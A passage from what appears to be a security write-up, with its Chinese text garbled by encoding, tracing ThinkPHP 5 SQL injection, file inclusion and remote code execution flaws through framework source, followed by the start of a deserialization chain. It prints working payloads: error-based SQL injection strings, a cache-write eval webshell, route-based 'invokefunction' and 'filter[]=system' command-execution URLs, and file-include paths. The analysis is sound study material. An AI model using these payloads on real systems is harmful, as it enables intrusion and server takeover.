·ã€æœ€ç»ˆå€¼è¢«å®Œæ•´å­˜è¿›$this-&gt;options[&#39;order&#39;]ä¸­ ç„¶åè‡ªç„¶åˆæ˜¯findäº†ã€‚å®ƒè°ƒç”¨Builderç±»çš„selectè‚¯å®šå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚ä¸è¿‡è¿™æ¬¡æˆ‘ä»¬orderbyè¿›å…¥çš„æ˜¯è¿™ä¸ªåˆ†æ”¯$this-&gt;parseOrder($query, $options[&#39;order&#39;]) 123456789101112131415161718192021222324252627282930protected function parseOrder(Query $query, $order)&#123; if (empty($order)) &#123; return ''; &#125; $array = []; foreach ($order as $key =&gt; $val) &#123; if ($val instanceof Expression) &#123; $array[] = $val-&gt;getValue(); &#125; elseif (is_array($val)) &#123; $array[] = $this-&gt;parseOrderField($query, $key, $val); &#125; elseif ('[rand]' == $val) &#123; $array[] = $this-&gt;parseRand($query); &#125; else &#123; if (is_numeric($key)) &#123; list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' '); &#125; else &#123; $sort = $val; &#125; $sort = strtoupper($sort); $sort = in_array($sort, ['ASC', 'DESC'], true) ? ' ' . $sort : ''; $array[] = $this-&gt;parseKey($query, $key, true) . $sort; &#125; &#125; return ' ORDER BY ' . implode(',', $array);&#125; è¿™é‡ŒåŒæ ·æ²¡æœ‰è¿‡æ»¤ã€‚å¤„ç†çš„å‡½æ•°åªæœ‰ä¸€ä¸ªparseKeyã€‚æ³¨æ„è¿™é‡Œçš„parseKeyæ˜¯db/builder/Mysql.phpä¸­çš„parseKeyã€‚ å®ƒå¯¹keyçš„å¤„ç†åªæ˜¯åŠ äº†åå¼•å·ç¯ç»•ã€‚å› æ­¤å…¶å®æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚æˆ‘ä»¬æ³¨å…¥payloadåªéœ€ç”¨æ³¨é‡Šç¬¦å³å¯è§£å†³æ‰ã€‚ æœ€åå®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼šåœ¨æ‹¼æ¥å­—ç¬¦ä¸²å‰å¯¹å˜é‡è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ )ã€# ä¸¤ä¸ªç¬¦å· tp5-sqli-Aggregatefuncitontp5sqlæ³¨å…¥æœ€åä¸€ä¸ªæ˜¯mysqlèšåˆå‡½æ•°å¯¼è‡´çš„æ¼æ´ã€‚ ç‰ˆæœ¬æ˜¯5.0.0&lt;=ThinkPHP&lt;=5.0.21 ã€ 5.1.3&lt;=ThinkPHP5&lt;=5.1.25ä¸åŒç‰ˆæœ¬åˆ©ç”¨payloadéœ€è¦å¾®è°ƒã€‚ ä¾‹å¦‚5.1.22ç‰ˆæœ¬payload 1?options&#x3D;id&#96;)+updatexml(1,concat(0x7e,user(),0x7e),1) from users# æˆ‘ä»¬è¿˜æ˜¯è·Ÿè¿›æºç ã€‚ä»å‰é¢å‡ æ¬¡çš„ç»éªŒæˆ‘ä»¬å·²ç»å¯ä»¥æ€»ç»“å‡º,tp5å­˜åœ¨æ¼æ´çš„å‡ ä¸ªç‰ˆæœ¬å¯¹è¾“å…¥çš„è¿‡æ»¤åŸºæœ¬æ²¡æœ‰æˆ–è€…å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚æ­¤å¤„æˆ‘ä»¬çš„è¾“å…¥åŒæ ·æ²¡æœ‰å—åˆ°è¿‡æ»¤å½±å“ã€‚å› æ­¤ç›´æ¥ä»$result = db(&#39;users&#39;)-&gt;max($options);è¿™é‡Œè·Ÿè¿›maxå‡½æ•°ã€‚å‘ç°è¿›è€Œè°ƒç”¨äº†aggregate 1234567891011121314public function aggregate($aggregate, $field, $force = false)&#123; $this-&gt;parseOptions(); $result = $this-&gt;connection-&gt;aggregate($this, $aggregate, $field); if (!empty($this-&gt;options['fetch_sql'])) &#123; return $result; &#125; elseif ($force) &#123; $result = (float) $result; &#125; return $result;&#125; ç»§ç»­çœ‹åˆ°Connectionç±»çš„aggregate 123456public function aggregate(Query $query, $aggregate, $field)&#123; $field = $aggregate . '(' . $this-&gt;builder-&gt;parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate); return $this-&gt;value($query, $field, 0);&#125; parsekeyå‡½æ•°ä¸Šé¢ä¸€ä¸ªæ³¨å…¥çš„ä¾‹å­æåˆ°äº†ã€‚æ˜¯å¯¹æˆ‘ä»¬çš„è¾“å…¥åœ¨ä¸¤ä¾§åŠ åå¼•å·çš„ä½œç”¨ã€‚é‚£ä¹ˆè‡ªç„¶æˆ‘ä»¬æ³¨å…¥payloadå¯ä»¥é—­åˆåŠ æ³¨é‡Šç¬¦è§£å†³æ‰ã€‚ä¸‹é¢ç›´æ¥çœ‹value.valueåŒæ ·ä¼šè°ƒç”¨æˆ‘ä»¬éå¸¸ç†Ÿæ‚‰çš„builderçš„selectæ–¹æ³•ã€‚åªä¸è¿‡è¿™æ¬¡è°ƒç”¨çš„æ˜¯parseField ã€‚æœ€åè¿˜æ˜¯æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†ã€‚è¿”å›è¯­å¥ã€‚ å®Œæ•´è¯­å¥å¦‚ä¸‹ 1SELECT MAX(`id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1 è‡³æ­¤tp5çš„sqlæ³¨å…¥ç³»åˆ—å°±ç»“æŸäº†ã€‚æ˜å¤©å¼€å§‹å…ˆçœ‹rce,ä¹‹åæ˜¯ååºåˆ—åŒ–popé“¾ã€‚ tp5-lfiIndex.phpé…ç½®å¦‚ä¸‹ 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html &#125;&#125; å½±å“ç‰ˆæœ¬:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.10 ä½¿ç”¨?cacheFile=1.jpg(jpgä¸ºå¯¹åº”å›¾ç‰‡é©¬)è§¦å‘lfi. é¦–å…ˆè¾“å…¥ç”±assign()å‡½æ•°å¤„ç†ã€‚æˆ‘ä»¬ä¸€è·¯è·Ÿåˆ°Viewç±»çš„assign()å‡½æ•°ã€‚ 123456789public function assign($name, $value = '')&#123; if (is_array($name)) &#123; $this-&gt;data = array_merge($this-&gt;data, $name); &#125; else &#123; $this-&gt;data[$name] = $value; &#125; return $this;&#125; çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ç›´æ¥ä¿å­˜åˆ°viewçš„$this-&gt;dataæ¥ä¸‹æ¥è°ƒç”¨fetch.æˆ‘ä»¬åŒæ ·ä¸€è·¯è·Ÿåˆ°Viewç±»çš„fetchä¸­ã€‚ 123456789101112131415161718192021222324252627public function fetch($template = '', $vars = [], $replace = [], $config = [], $renderContent = false)&#123; // æ¨¡æ¿å˜é‡ $vars = array_merge(self::$var, $this-&gt;data, $vars); // é¡µé¢ç¼“å­˜ ob_start(); ob_implicit_flush(0); // æ¸²æŸ“è¾“å‡º try &#123; $method = $renderContent ? 'display' : 'fetch'; // å…è®¸ç”¨æˆ·è‡ªå®šä¹‰æ¨¡æ¿çš„å­—ç¬¦ä¸²æ›¿æ¢ $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config('tpl_replace_string')); $this-&gt;engine-&gt;config('tpl_replace_string', $replace); $this-&gt;engine-&gt;$method($template, $vars, $config); &#125; catch (\\Exception $e) &#123; ob_end_clean(); throw $e; &#125; // è·å–å¹¶æ¸…ç©ºç¼“å­˜ $content = ob_get_clean(); // å†…å®¹è¿‡æ»¤æ ‡ç­¾ Hook::listen('view_filter', $content); return $content;&#125; è¿™é‡Œå¾ˆå¿«ä¼šå‘ç°å®é™…è°ƒç”¨çš„æ˜¯$this-&gt;engine-&gt;$method($template, $vars, $config);.è€Œ$methodæ­¤å¤„ä¸ºfetch,$varsä¸ºæˆ‘ä»¬å¯æ§çš„ä¼ å…¥å˜é‡ã€‚æ¥ä¸‹æ¥ç”±æ¨¡æ¿å¼•æ“å¤„ç†æˆ‘ä»¬çš„å˜é‡ 1234567891011121314public function fetch($template, $data = [], $config = [])&#123; if ('' == pathinfo($template, PATHINFO_EXTENSION)) &#123; // è·å–æ¨¡æ¿æ–‡ä»¶å $template = $this-&gt;parseTemplate($template); &#125; // æ¨¡æ¿ä¸å­˜åœ¨ æŠ›å‡ºå¼‚å¸¸ if (!is_file($template)) &#123; throw new TemplateNotFoundException('template not exists:' . $template, $template); &#125; // è®°å½•è§†å›¾ä¿¡æ¯ App::$debug &amp;&amp; Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info'); $this-&gt;template-&gt;fetch($template, $data, $config);&#125; æ³¨æ„åˆ°å¦‚æœ$templateå¯¹åº”çš„è·¯å¾„æ–‡ä»¶ä¸å­˜åœ¨çš„è¯ç›´æ¥æŠ¥é”™äº†ã€‚æ‰€ä»¥è¿™ä¸ªlfiæ´çš„å‰æè¿˜å¾—éœ€è¦æˆ‘ä»¬ç¯å¢ƒä»£ç ä¸­å­˜åœ¨å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.htmlã€‚å¦‚æœè¿™é‡Œæ²¡æŠ¥é”™å³è¿›å…¥templateçš„fetch.çœ‹åˆ°$varsè¢«èµ‹ç»™data.è€Œé©¬ä¸Šä¸‹é¢storageè°ƒç”¨äº†readå‡½æ•°ã€‚é‡Œé¢å­˜åœ¨extractè¿™æ ·çš„å˜é‡è¦†ç›–ä»£ç ã€‚å¹¶ä¸”ç›´æ¥includecacheFileã€‚ ä¹Ÿå°±æ˜¯è¯´,$cacheFileå¯ä»¥è¢«å˜é‡è¦†ç›–ã€‚è¾¾æˆlfiã€‚ å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯é€šè¿‡å°†$cacheFile å˜é‡å­˜å‚¨åœ¨ $this-&gt;cacheFile ä¸­.é˜²æ­¢å˜é‡è¦†ç›–ã€‚ tp5.0-rceIndex.phpé…ç½® 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Cache;class Index&#123; public function index() &#123; Cache::set(\"name\",input(\"get.username\")); return 'Cache success'; &#125;&#125; payload 1http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username&#x3D;byc_404%0d%0a@eval($_GET[_]);&#x2F;&#x2F; ä¸Šé¢çš„payloadå°†æŠŠä¸€å¥è¯webshellå†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚è®¿é—®å¯¹åº”è·¯å¾„å³å¯ã€‚ è¿™ä¸ªç”¨ä¾‹å…¶å®è·Ÿä»¥å‰ichunqiuå¹³å°ä¸Šä¸€é“thinkphpäºŒæ¬¡å¼€å‘çš„æ¨¡æ¿ç¼“å­˜æ–‡ä»¶getshellå¾ˆç›¸ä¼¼ã€‚è¿™é‡Œæ¥è·Ÿè¿›ä¸‹æºç  12345678910111213141516171819202122public static function set($name, $value, $expire = null)&#123; self::$writeTimes++; return self::init()-&gt;set($name, $value, $expire);&#125;......public static function init(array $options = [])&#123; if (is_null(self::$handler)) &#123; // è‡ªåŠ¨åˆå§‹åŒ–ç¼“å­˜ if (!empty($options)) &#123; $connect = self::connect($options); &#125; elseif ('complex' == Config::get('cache.type')) &#123; $connect = self::connect(Config::get('cache.default')); &#125; else &#123; $connect = self::connect(Config::get('cache')); &#125; self::$handler = $connect; &#125; return self::$handler;&#125; è¿™é‡Œinit()å‡½æ•°ä¸»è¦æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªhandlerå¯¹è±¡ã€‚æ­¤å¤„ä¸ºé»˜è®¤å€¼Fileç±»ã€‚é‚£ä¹ˆå‰å¾€cache/driver/Fileç±»çœ‹ä¸‹.æ­¤å¤„Fileç±»çš„setæ–¹æ³•å¦‚ä¸‹ 123456789101112131415161718192021222324public function set($name, $value, $expire = null)&#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; $filename = $this-&gt;getCacheKey($name); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); &#125; $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . $data . \"\\n?&gt;\"; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125;&#125; å¯ä»¥çœ‹åˆ°ã€‚æ•°æ®$valueç»ç”±åºåˆ—åŒ–åè¢«æ‹¼æ¥åˆ°å«æœ‰phpä»£ç å—çš„è¯­å¥ä¸­ã€‚ä¹‹åæ‰§è¡Œfile_put_contents.ç¬¦åˆæˆ‘ä»¬å†™å…¥shellçš„ç”¨æ³•ã€‚å› æ­¤åªéœ€æ³¨æ„ä½¿ç”¨æ¢è¡Œç¬¦bypasså‰é¢çš„æ³¨é‡Šç¬¦å³å¯ã€‚ å½“ç„¶è¿™ä¸ªå†™shell rceçš„æ–¹æ³•æ¯”è¾ƒå°´å°¬ã€‚å› ä¸ºæ–‡ä»¶åå¯ä»¥çœ‹åˆ°ç”±getCacheKeyå†³å®šã€‚å…¶æ–‡ä»¶åç”Ÿæˆæ–¹å¼å¦‚ä¸‹ï¼šå…ˆè®¡ç®—é”®åmd5å€¼ã€‚å†å–å‰ä¸¤ä½ä¸ºç›®å½•ã€‚å30ä½ä¸ºæ–‡ä»¶åã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯å› ä¸ºæå‰è®¾å®šå¥½äº†Index.phpä¸­é”®åä¸ºname.æ‰€ä»¥å¯ä»¥è®¡ç®—æ–‡ä»¶åb0/68931cc450442b63f5b3d276ea4297.phpã€‚ä½†æ˜¯å®é™…ä¸­å¦‚æœæ²¡æœ‰æºç æ³„éœ²æ— æ³•å¾—çŸ¥é”®åã€‚ä¹Ÿå°±æ²¡æ³•è®¡ç®—shellçš„è·¯å¾„ã€‚ å½“ç„¶ã€‚åœ¨ååºåˆ—åŒ–popé“¾ä¸­æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªFileç±»å…³äºæ–‡ä»¶åå¯æ§çš„é—®é¢˜å°±å¤§ä¸ä¸€æ ·äº†ã€‚å…·ä½“åé¢å†è¯´ã€‚ tp5.*-rce-getæ¯”è¾ƒå‡ºåçš„rceæ´ã€‚å½±å“ç‰ˆæœ¬5.0.7&lt;=ThinkPHP5&lt;=5.0.22 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.30ã€‚5.1.xç‰ˆæœ¬çš„payloadæœ‰ 12345?s&#x3D;index&#x2F;\\think\\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd?s&#x3D;index&#x2F;\\think\\view\\driver\\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\\think\\template\\driver\\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\\think\\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id 5.0.* 1234?s&#x3D;index&#x2F;think\\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯?s&#x3D;index&#x2F;\\think\\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg # åŒ…å«ä»»æ„æ–‡ä»¶?s&#x3D;index&#x2F;\\think\\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php # åŒ…å«ä»»æ„.phpæ–‡ä»¶?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id é¦–å…ˆèµ·å› å¯ä»¥ä»config/app.phpä¸­çœ‹åˆ°ã€‚é»˜è®¤æƒ…å†µä¸‹var_pathinfoä¸ºs.url_route_mustä¸ºfalse æ˜¾ç„¶æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨æ§åˆ¶å™¨ã€‚thinkphpä¸­çš„æµç¨‹æ˜¯http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³• åœ¨é‡è¦ä»£ç controllerå¤„ä¸‹æ–­ç‚¹ï¼ˆæ­¤å¤„ä¹Ÿæ˜¯5.1.30åé«˜ç‰ˆæœ¬å®˜æ–¹ä¿®æ”¹çš„éƒ¨åˆ†ã€‚è¯´æ˜åŸä»£ç å­˜åœ¨é—®é¢˜ï¼‰payload 1?s&#x3D;index&#x2F;\\think\\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami è‡ªåŠ¨è·Ÿéšdebugè°ƒç”¨å‡½æ•°è·Ÿè¿›ã€‚å¼€å§‹åœ¨controllerè¿™å¯ä»¥çœ‹è§$resultå˜é‡æ˜¯å­˜å‚¨äº†æˆ‘ä»¬ä¼ å…¥çš„å€¼çš„æ•°ç»„ã€‚å…¶å€¼åˆ†åˆ«ä¸ºindex,\\think\\Request,input.ä¸€è·¯è·Ÿä¸‹å»ä¼šå‘ç°æ‰§è¡Œä»£ç çš„å…³é”®ä½ç½®åœ¨thinkphp\\library\\think\\route\\dispatch\\Module.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public function exec()&#123; // ç›‘å¬module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // å®ä¾‹åŒ–æ§åˆ¶å™¨ $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // è·å–å½“å‰æ“ä½œå $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡ $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; ä»”ç»†ä¸€çœ‹å…¶å®å°±æ˜¯è°ƒç”¨äº†åå°„æ–¹æ³•ã€‚ç”¨$this-&gt;controller,$this-&gt;actionName.å› ä¸ºä¹‹å‰æˆ‘ä»¬çŸ¥é“Request ç±»çš„inputå‡½æ•°ä¼šå¯¹è¾“å…¥æ‰§è¡Œcall_user_funcæ“ä½œã€‚å› æ­¤æœ€åæ‰§è¡Œäº†call_user_func(&#39;system&#39;,&#39;whoami&#39;)å› æ­¤å®˜æ–¹æœ€åçš„ä¿®å¤æ˜¯é’ˆå¯¹è¾“å…¥æ§åˆ¶å™¨åè¿›è¡Œè¿‡æ»¤^[A-Za-z](\\w)*$ tp-5.*-rce-posté¦–å…ˆè¿™ä¸ªrceç‰ˆæœ¬5.0.*åº”è¯¥æ˜¯å°äº5.0.24çš„ã€‚æ‰€ä»¥ç”¨ä¸€ä¸ª5.0.23ç‰ˆæœ¬çš„å®éªŒä¸‹ã€‚ é¦–å…ˆpayload 12POST &#x2F;?s&#x3D;index&#x2F;index HTTP&#x2F;1.1_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami è¿™é‡Œå› ä¸ºæˆ‘çš„Index.phpæ˜¯ä¹‹å‰å®éªŒifiæ—¶çš„ã€‚æ‰€ä»¥index/indexè·¯ç”±è¿”å›Cache Success.å®é™…ä¸Šsåªéœ€è¦èµ‹ç»™ä¸€ä¸ªå­˜åœ¨methodçš„æ§åˆ¶å™¨å³å¯ã€‚ ä¸‹é¢æ¥è·Ÿä¸‹æºç ã€‚é¦–å…ˆä»å®˜æ–¹commitä¿®æ”¹å¤„å¯ä»¥çœ‹å‡ºåŸå…ˆä»£ç ä¸­this-&gt;$methodå˜é‡æ¥è‡ªå¯æ§æ•°æ®$_POST 123if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨Requestç±»çš„methodäº†ã€‚çœ‹åˆ°payloadä¸­å­˜åœ¨__constructã€‚è‡ªç„¶çœ‹å‘æ„é€ æ–¹æ³• 1234567891011121314protected function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125; // ä¿å­˜ php://input $this-&gt;input = file_get_contents('php://input');&#125; è¿™ä¸ªforeachæ˜æ˜¾å­˜åœ¨é…ç½®è¦†ç›–çš„å†™æ³•ã€‚è¿™é‡Œç»§ç»­ä¸‹æ–­ç‚¹ä¸€è·¯è·Ÿå‘ç°ä¼šæ ¹æ®app_debugçš„å€¼å‰å¾€å½“å‰ç±»ä¸‹paramæ–¹æ³•ã€‚è€Œè¿™ä¸ªæ–¹æ³•å…¨éƒ½èµ°inputæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯éƒ½ä¼šè°ƒç”¨äº†call_user_funcã€‚å…·ä½“å¯ä»¥çœ‹è¿™å¼ å›¾ å‰é¢æåˆ°æˆ‘ä»¬å¯ä»¥è¦†ç›–å±æ€§ã€‚è¿™é‡Œä¸»è¦å°±æ˜¯è¦†ç›–filterè·Ÿserverã€‚å› ä¸ºmethodæ–¹æ³•ä¸­æ˜¯å–çš„æˆ‘ä»¬ä¼ å…¥çš„this-&gt;server[&#39;REQUEST_METHOD&#39;]çš„å€¼ã€‚æ‰€ä»¥è¦†ç›–ä¸ºwhoamiåä½œä¸ºå‚æ•°è¢«é€åˆ°input.inputåˆå› ä¸ºfiltervalueæ–¹æ³•è°ƒç”¨call_user_funcã€‚ç›´æ¥åˆ©ç”¨è¦†ç›–çš„systemä½œä¸ºfliterå€¼å³å¯ã€‚æœ€ååˆ°è¾¾call_user_func rce tp5.0.x-unserializeè¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è·Ÿä¸‹tp5.0ç‰ˆæœ¬çš„ååºåˆ—åŒ–popé“¾ã€‚ä¸è¿‡è¿™é‡Œä¸ä¼šåˆ†äº«exp.(ç½‘ä¸Šè·Ÿå…ˆçŸ¥åº”è¯¥éƒ½èƒ½å¾ˆæ–¹ä¾¿æ‰¾åˆ°)ã€‚å¦‚æœéœ€è¦çš„è¯è‡ªå·±SCTF2020wpé‡Œæœ‰ç»•è¿‡çŸ­æ ‡ç­¾çš„expã€‚ä»¥åŠä»¥å‰è·Ÿphpæ¡†æ¶æœ‰å‡ ä¸ªå…¶ä»–çš„expå¯ä»¥è‡ªè¡Œå¯»æ‰¾ã€‚å½“ç„¶æˆ‘è®°å¾—wh1t3P1gå¤§ä½¬è‡ªå·±æŠŠtpçš„popchainé›†æˆåˆ°phpggcä¸­äº†ã€‚ä¹Ÿå¯ä»¥è‡ªåŠ¨ç”Ÿæˆã€‚ ç„¶åå°±æ˜¯windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚ç›®å‰èƒ½å¤Ÿåœ¨php7ä»¥å‰çš„ç‰ˆæœ¬å†™shell expæ˜¯æœ‰çš„ã€‚ä½†php7çš„windowså†™shellæˆ‘è¿˜æ²¡æˆåŠŸè¿‡ã€‚ç†è®ºä¸Šwindowsä¸èƒ½æˆåŠŸçš„åŸå› åªæ˜¯å› ä¸ºæ–‡ä»¶åä¸å…è®¸&lt;,?çš„ã€‚ä½†æ˜¯å¦‚æœç”¨è¿‡æ»¤å™¨ç»•è¿‡çš„è¯åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„â€¦â€¦php5.4.45+windows æˆåŠŸå†™å…¥phpinfo() (å…³é—­çŸ­æ ‡ç­¾) è¿™é‡Œæˆ‘å°±ç›´æ¥è·Ÿä¸‹linuxçš„payloadå§ã€‚é¦–å…ˆæ˜¯å…¥å£ç‚¹ã€‚è‚¯å®šæ˜¯æ‰¾__destructå‡½æ•°ã€‚ä¸éš¾å‘ç°ä¸€å…±åªæœ‰å‡ ä¸ªå¯ç”¨ã€‚æˆ‘ä»¬æ‰¾åˆ° library\\think\\process\\pipesä¸‹windows.phpã€‚å‘ç°å…¶è°ƒç”¨äº†$this-&gt;removeFiles.è€ŒremoveFilesåˆè°ƒç”¨äº†file_existså¯ä»¥è§¦å‘__toStringæ–¹æ³•ã€‚ 123456789private function removeFiles()&#123; foreach ($this-&gt;files as $filename) &#123; if (file_exists($filename)) &#123; @unlink($filename); &#125; &#125; $this-&gt;files = [];&#125; ps.å…³äºfile_existså¯ä»¥è§¦å‘__toStringè‡ªå·±ä»¥å‰è¿˜æ²¡æœ‰æ³¨æ„è¿‡ã€‚å…·ä½“ä¸å¦¨å»l3m0nå¸ˆå‚…è¿™ç¯‡æ–‡ç« ä¸‹è¯„è®ºçœ‹çœ‹ã€‚(åº”è¯¥æ˜¯å› ä¸ºfile_existsæ¥å—å­—ç¬¦ä¸²å‚æ•°,è€Œåªè¦å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å³ä¼šè§¦å‘__toString)å…¨å±€ç»§ç»­æ‰¾toString.ä¹Ÿåªæœ‰å‡ ä¸ªé€‰æ‹©ã€‚è¿™é‡Œæ‰¾åˆ° think\\Model.php.å®ƒè°ƒç”¨äº†toJsonã€‚è€ŒtoJsonç»§ç»­è°ƒç”¨äº†toArray. 1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123; return json_encode($this-&gt;toArray(), $options);&#125; åŒæ—¶æ³¨æ„è¿™é‡ŒModelç±»æ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®é™…ç¼–å†™expæ—¶æˆ‘ä»¬å¿…é¡»ç”¨å®ƒçš„å­ç±»ã€‚æ¯”å¦‚æ­¤å¤„çš„Pivotã€‚æˆ‘ä»¬ç›´æ¥æ¥åˆ°toArrayã€‚è¿™é‡Œé¦–å…ˆä¸»è¦çœ‹æœ‰æ²¡æœ‰å¯ä»¥è§¦å‘__callçš„æƒ…å†µã€‚5.0.24ç‰ˆæœ¬ä¸‹åº”è¯¥åˆä¸‰å¤„éƒ½æ˜¯å¯ä»¥æ»¡è¶³çš„ 123$relation = $this-&gt;getAttr($key);$value = $this-&gt;getRelationData($modelRelation);$item[$key] = $value ? $value-&gt;getAttr($attr) : null; ä¸å…¶è¯´æ˜¯æ‰¾è§¦å‘__callçš„ã€‚ä¸å¦‚è¯´æ˜¯æ‰¾å¯ç”¨æ–¹æ³•ã€‚å¤šæ•°æƒ…å†µä¸‹è¿™äº›æ–¹æ³•åŸºæœ¬åˆ©ç”¨ä¸äº†ã€‚ä½†æ˜¯å¦‚æœæ»¡è¶³this-&gt;xxx($var)æˆ–è€…è¿›ä¸€æ­¥å¯æ§ç±»-&gt;xxx(å¯æ§å˜é‡)ã€‚æˆ‘ä»¬å°±èƒ½æ‰¾ä»»æ„ç±»çš„__callè¿›è¡Œè¿›ä¸€æ­¥æŒ–æ˜ã€‚è¿™ä¹Ÿæ˜¯popé“¾ä¸­callæ–¹æ³•ç»å¸¸ç”¨åˆ°çš„åŸå› ä¹‹ä¸€ã€‚ ä¸ºäº†äº†è§£æˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™ä¸€æ­¥ç”¨æ¥è°ƒç”¨__callã€‚æˆ‘ä»¬å…ˆæ”¾ä¸€ä¸‹å…¨å±€æ‰¾__callçš„è¿‡ç¨‹ã€‚æ¥é€‰æ‹©ä¸€ä¸ªè§¦å‘æ–¹å¼ã€‚å¯¹äº$item[$key] = $value ? $value-&gt;getAttr($attr) : 